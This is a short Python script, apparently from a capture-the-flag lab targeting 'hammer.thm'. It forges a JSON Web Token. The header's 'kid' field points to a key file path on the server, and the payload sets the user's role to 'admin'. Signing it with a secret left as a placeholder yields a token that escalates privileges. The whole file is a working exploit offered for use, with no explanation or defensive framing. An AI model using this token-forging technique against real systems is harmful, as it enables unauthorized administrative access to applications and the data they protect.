import jwt
from datetime import datetime

# Secret key
secret_key = "INSERT SECRET KEY HERE"

# JWT header'
header = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "/var/www/html/188ade1.key"
}

# Set JWT Issued at Time and Expiration Time

iat = int(datetime(2025, 1, 28, 18, 0).timestamp())
exp = int(datetime(2025, 1, 28, 19, 0).timestamp())

# Payload with the 'admin' role
payload = {
    "iss": "http://hammer.thm",
    "aud": "http://hammer.thm",
    "iat": iat, # change this Value to be Issued at Time that you need
    "exp": exp, # change this value to be coherent with expiration date
    "data": {
        "user_id": 1,
        "email": "tester@hammer.thm",
        "role": "admin"
    }
}

# Encode the JWT
token = jwt.encode(payload, secret_key, algorithm="HS256", headers=header)

# Print the token
print(token)
